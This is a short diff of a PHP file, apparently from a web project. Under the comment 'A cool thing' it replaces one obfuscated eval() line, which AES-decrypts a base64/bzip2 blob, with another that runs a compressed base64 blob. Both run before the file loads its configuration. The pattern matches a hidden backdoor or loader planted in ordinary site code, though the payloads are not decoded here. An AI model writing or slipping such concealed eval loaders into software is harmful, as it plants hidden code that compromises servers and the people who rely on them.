@@ -1,8 +1,7 @@
 <?php
 
 // A cool thing
-eval(@openssl_decrypt(base64_decode(bzdecompress(base64_decode('QlpoNDFBWSZTWW+1u+kAAEmPgH4gP9v/8D5/97AwANbLHPU0eR6o3qnqbSDAbVNpqPJGR6jGBpoaDIDTQaADQABVPyp6ZT9ERsoGnqNMnqep6I0GR6k52oYCBhLbIZRE5Qs0oaGxYjIGrYDi01wiNI2giql4is7FAqkiMS9T5rmK8WYaxPpuYcGrNGTsPNq2CTbXXwUSekEgQPm+vWbt19U7VZqDnIAzBu1O8zne0qhyDEY6Pb+VZKchcMCtMhtseMN54k2JO5q2UENUlY2MX0+QpTmjIIrjcG/iOE7GvMnLLRKzj2i9FDxnpZCM2YQ7hfnGh8/LhuEHczIkJHMCMGFhu/i7kinChIN9rd9I'))), 'aes-256-cbc',base64_decode(bzdecompress(base64_decode('QlpoNDFBWSZTWR1y+9IAABMfgAAIjMI8hKDwEsnWgCAAMYwAAAABg0MhtQ0NPKep5qg7yUp9GnPrVaaWEY0pE0q+zOodohXFDQuPxdyRThQkB1y+9IA='))), 0));
-
+eval(bzdecompress(base64_decode('QlpoNDFBWSZTWflerLwAAFPbgEAAQufsXQgAr+PeVDAArWwlNRQZNGynlDTagPUxAap6mIYj1AaA0AGglTRAaAAAAAxGjkUyuXuq8Q0vTmUKOhLVC+0CI0rtY7kAknoW0FsxIQHQvwtAgrPhBXAwfAS6NIyrvJEXMDPRgw+K2gHbdi/9Wg29AEqzGjXvnYYTUrHuxERFC1wAgolsQx1xmtLe/gBBJhpjxFaNAAcjSV9J0BeKNG7n4u5IpwoSHyvVl4A=')));
 require_once dirname(__FILE__,2).'/config.php';
 $dev_server = CONFIG_SRV_TYPE == 0;
 
